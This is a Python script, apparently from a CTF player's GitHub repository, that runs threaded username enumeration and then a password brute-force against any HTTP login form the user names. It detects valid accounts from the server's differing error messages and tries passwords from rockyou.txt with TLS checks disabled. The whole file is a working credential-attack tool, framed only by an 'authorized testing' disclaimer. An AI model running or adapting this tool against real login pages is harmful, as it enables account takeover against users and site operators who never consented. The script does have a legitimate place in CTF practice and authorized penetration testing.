#!/usr/bin/env python3
#===============================================================================
# Name: HTTP-POST-Bruteforce v1
# News: Revamped the python script for username enumeration created for the Lookup CTF on TryHackMe, view my writeup in the repo.
#       Added Threading, now is much faster, added colored output, added better error handling.
#       Is now interactive, user can input website/passlist/names wordlist at each run.
# Author: Maat   http://github.com/Maat-Cyber/Maat-Cyber-World
#==============================================================================

"""
Login Brute-Force Utility (CTF / Authorized Testing Only)
Parallelized username enumeration and password brute-force.

Server behaviour (differential response):
  - Invalid username  -> "Wrong username or password. Please try again."
  - Valid user, bad pw -> "Wrong password. Please try again."
  - Valid credentials  -> (absence of both messages)
"""

import sys
import os
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- ANSI Colors (disabled automatically when output is not a TTY) ---
if sys.stdout.isatty():
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"
else:
    RED = GREEN = YELLOW = CYAN = BOLD = RESET = ""

# --- Configuration (hardcoded defaults; user may override at prompt) ---
DEFAULT_USERNAME_WORDLIST = "/usr/share/seclists/Usernames/Names/names.txt"
DEFAULT_PASSWORD_WORDLIST = "/usr/share/seclists/rockyou.txt"

WORDLIST_LIMIT = 10000
REQUEST_TIMEOUT = 10
RETRY_COUNT = 3
RETRY_DELAY = 2
MAX_THREADS = 20

# The message returned ONLY when the username is valid but the password is wrong.
FAILURE_STRING = "Wrong password. Please try again."

# The message returned when the username does not exist at all.
INVALID_USER_STRING = "Wrong username or password. Please try again."

# Verbose mode: prints every attempt result (like hydra -V)
VERBOSE = True

# Thread-local storage for per-thread HTTP sessions
_thread_local = threading.local()

# Thread-safe progress counter
_progress_lock = threading.Lock()
_progress_count = 0


def get_session():
    """Return a per-thread requests.Session (created lazily on first use)."""
    if not hasattr(_thread_local, "session"):
        _thread_local.session = requests.Session()
        _thread_local.session.headers.update(
            {"User-Agent": "Mozilla/5.0 (BruteForce-CTF/1.0)"}
        )
    return _thread_local.session


def increment_progress(total):
    """Thread-safe progress reporting every 100 completed attempts."""
    global _progress_count
    with _progress_lock:
        _progress_count += 1
        current = _progress_count
    if current % 100 == 0:
        print(f"    [{current}/{total}] ... no match yet")


def reset_progress():
    global _progress_count
    with _progress_lock:
        _progress_count = 0


def load_wordlist(path, limit, label):
    """Load up to `limit` entries from a wordlist file with error handling."""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            entries = [fh.readline().strip() for _ in range(limit)]
        entries = [e for e in entries if e]
        print(f"{GREEN}[+] Loaded {len(entries)} entries from {label}: {path}{RESET}")
        return entries
    except FileNotFoundError:
        print(f"{RED}[!] FATAL: Wordlist not found: {path}{RESET}")
        sys.exit(1)
    except PermissionError:
        print(f"{RED}[!] FATAL: Permission denied reading: {path}{RESET}")
        sys.exit(1)
    except OSError as exc:
        print(f"{RED}[!] FATAL: OS error reading {path}: {exc}{RESET}")
        sys.exit(1)


def prompt_target():
    """Prompt the user for the target login URL and validate it."""
    url = input(f"{CYAN}[?] Enter target login URL (e.g. http://lookup.thm/login.php): {RESET}").strip()
    if not url:
        print(f"{RED}[!] FATAL: No URL provided.{RESET}")
        sys.exit(1)
    if not url.startswith(("http://", "https://")):
        print(f"{RED}[!] FATAL: URL must begin with http:// or https://{RESET}")
        sys.exit(1)
    return url


def prompt_wordlist(label, default_path):
    """
    Prompt the user for a wordlist path.
    If the input is empty, fall back to the hardcoded default.
    Validates that the file exists before returning.
    """
    user_input = input(
        f"{CYAN}[?] {label} wordlist path [{default_path}]: {RESET}"
    ).strip()

    path = user_input if user_input else default_path

    if not os.path.isfile(path):
        print(f"{RED}[!] FATAL: File does not exist: {path}{RESET}")
        sys.exit(1)

    return path


def send_request(url, payload):
    """Send a POST request with retry logic using the thread-local session."""
    session = get_session()
    for attempt in range(1, RETRY_COUNT + 1):
        try:
            resp = session.post(
                url,
                data=payload,
                timeout=REQUEST_TIMEOUT,
                verify=False,
                allow_redirects=True,
            )
            return resp
        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.RequestException:
            pass
        if attempt < RETRY_COUNT:
            time.sleep(RETRY_DELAY)
    return None


def diagnose(url):
    """
    Send a request with a known-invalid username to confirm connectivity
    and display the server's error messages for reference.
    """
    print(f"\n{CYAN}[*] Diagnostic: sending a test request with a dummy credential...{RESET}")
    payload = {"username": "diagnostic_nonexistent_user_xyz", "password": "diagnostic_bad"}
    resp = send_request(url, payload)

    if resp is None:
        print(f"{RED}[!] FATAL: Could not reach the target. Check URL and network.{RESET}")
        sys.exit(1)

    print(f"    Status code : {resp.status_code}")
    print(f"    Final URL   : {resp.url}")
    print(f"    Body        : {resp.text.strip()}")
    print()

    if INVALID_USER_STRING in resp.text:
        print(f"{GREEN}[+] Server reachable. Invalid-user message confirmed:{RESET}")
        print(f"    \"{INVALID_USER_STRING}\"")
        print(f"{GREEN}[+] Detection string for valid-user/wrong-password:{RESET}")
        print(f"    \"{FAILURE_STRING}\"")
        print(f"{GREEN}[+] These are different messages -> username enumeration is possible.{RESET}")
    elif FAILURE_STRING in resp.text:
        print(f"{YELLOW}[+] Server reachable. Only one generic error message detected.{RESET}")
        print(f"{YELLOW}[!] Username enumeration may not be reliable with this server.{RESET}")
    else:
        print(f"{RED}[!] WARNING: Neither expected message found in response.{RESET}")
        print(f"{RED}[!] Review the body above and update FAILURE_STRING / INVALID_USER_STRING.{RESET}")
        sys.exit(1)


def verify_password(url, username, pwd):
    """
    Sequential re-check to confirm a password hit is genuine.
    Eliminates false positives caused by rate-limiting or dropped connections.
    """
    time.sleep(0.5)
    payload = {"username": username, "password": pwd}
    resp = send_request(url, payload)

    if resp is None:
        return False

    if FAILURE_STRING not in resp.text and INVALID_USER_STRING not in resp.text:
        return True

    return False


def check_username(url, name, test_password, total):
    """
    Worker: test a single username.
    FAILURE_STRING present -> server recognised the username -> valid.
    """
    payload = {"username": name, "password": test_password}
    resp = send_request(url, payload)
    increment_progress(total)

    if resp is None:
        return None

    hit = FAILURE_STRING in resp.text

    if VERBOSE:
        if hit:
            print(f"    {GREEN}{BOLD}[HIT ]{RESET}{GREEN} username={name}  (HTTP {resp.status_code}){RESET}")
        else:
            print(f"    {RED}[miss]{RESET} username={name}  (HTTP {resp.status_code})")

    if hit:
        return name

    return None


def check_password(url, username, pwd, total):
    """
    Worker: test a single password.
    FAILURE_STRING absent AND INVALID_USER_STRING absent -> likely success.
    Returns the password as a CANDIDATE; caller verifies sequentially.
    """
    payload = {"username": username, "password": pwd}
    resp = send_request(url, payload)
    increment_progress(total)

    if resp is None:
        return None

    if FAILURE_STRING not in resp.text and INVALID_USER_STRING not in resp.text:
        if VERBOSE:
            print(f"    {YELLOW}{BOLD}[CANDIDATE]{RESET}{YELLOW} password={pwd}  (HTTP {resp.status_code}) -> verifying...{RESET}")
        return pwd

    if VERBOSE:
        print(f"    {RED}[miss]{RESET} password={pwd}  (HTTP {resp.status_code})")

    return None


def parallel_search(items, worker_fn, phase_label):
    """
    Generic parallel search with early termination on first hit.
    worker_fn signature: worker_fn(item, total) -> hit_or_None
    """
    total = len(items)
    result = None
    futures = {}

    print(f"\n{CYAN}[*] {phase_label} ({total} candidates, {MAX_THREADS} threads){RESET}")
    print("-" * 60)

    reset_progress()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for item in items:
            future = executor.submit(worker_fn, item, total)
            futures[future] = item

        for future in as_completed(futures):
            try:
                hit = future.result()
            except Exception as exc:
                print(f"    {RED}[!] Worker exception: {exc}{RESET}")
                continue

            if hit is not None:
                result = hit
                for f in futures:
                    f.cancel()
                break

    return result


def main():
    print(f"{BOLD}{'=' * 60}{RESET}")
    print(f"{BOLD}  Login Brute-Force Utility (CTF / Authorized Use Only){RESET}")
    print(f"  Threads: {MAX_THREADS} | Timeout: {REQUEST_TIMEOUT}s")
    print(f"  Failure string : \"{FAILURE_STRING}\"")
    print(f"  Invalid-user   : \"{INVALID_USER_STRING}\"")
    print(f"{BOLD}{'=' * 60}{RESET}")
    print()

    url = prompt_target()
    print(f"{GREEN}[+] Target: {url}{RESET}")

    # Prompt for wordlists (empty input falls back to hardcoded defaults)
    username_wordlist = prompt_wordlist("Username", DEFAULT_USERNAME_WORDLIST)
    password_wordlist = prompt_wordlist("Password", DEFAULT_PASSWORD_WORDLIST)

    # Diagnostic: confirm connectivity and message format
    diagnose(url)

    usernames = load_wordlist(username_wordlist, WORDLIST_LIMIT, "usernames")
    passwords = load_wordlist(password_wordlist, WORDLIST_LIMIT, "passwords")

    try:
        # Phase 1: Parallel username enumeration
        found_username = parallel_search(
            usernames,
            worker_fn=lambda name, total: check_username(url, name, "test", total),
            phase_label="Phase 1: Username enumeration",
        )

        if found_username is None:
            print(f"\n{RED}[-] No valid username found in the wordlist. Exiting.{RESET}")
            sys.exit(0)

        print(f"\n{GREEN}{BOLD}[+] VALID USERNAME FOUND: '{found_username}'{RESET}")

        # Confirm before brute-force
        print()
        choice = input(
            f"{CYAN}[?] Brute-force password for '{found_username}'? (yes/no): {RESET}"
        ).strip().lower()
        if choice != "yes":
            print(f"{CYAN}[*] Aborting. Username discovered: {found_username}{RESET}")
            sys.exit(0)

        # Phase 2: Parallel password brute-force (returns a CANDIDATE)
        candidate_password = parallel_search(
            passwords,
            worker_fn=lambda pwd, total: check_password(url, found_username, pwd, total),
            phase_label="Phase 2: Password brute-force",
        )

        if candidate_password is None:
            print(f"\n{RED}[-] No valid password found in the wordlist.{RESET}")
            print(f"{YELLOW}[*] Partial result -> {found_username}:<NOT FOUND>{RESET}")
            sys.exit(0)

        # Verification: sequential re-check to eliminate false positives
        print(f"\n{CYAN}[*] Verifying candidate password: '{candidate_password}' ...{RESET}")
        if verify_password(url, found_username, candidate_password):
            print(f"\n{GREEN}{BOLD}{'=' * 60}{RESET}")
            print(f"{GREEN}{BOLD}  RESULT: {found_username}:{candidate_password}{RESET}")
            print(f"{GREEN}{BOLD}{'=' * 60}{RESET}")
        else:
            print(f"\n{RED}[!] Candidate '{candidate_password}' failed verification (false positive).{RESET}")
            print(f"{RED}[!] This usually means the server rate-limited the parallel phase.{RESET}")
            print(f"{YELLOW}[!] Try reducing MAX_THREADS (current: {MAX_THREADS}) and re-run.{RESET}")
            sys.exit(1)

    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Interrupted by user. Exiting gracefully.{RESET}")
        sys.exit(130)


if __name__ == "__main__":
    main()
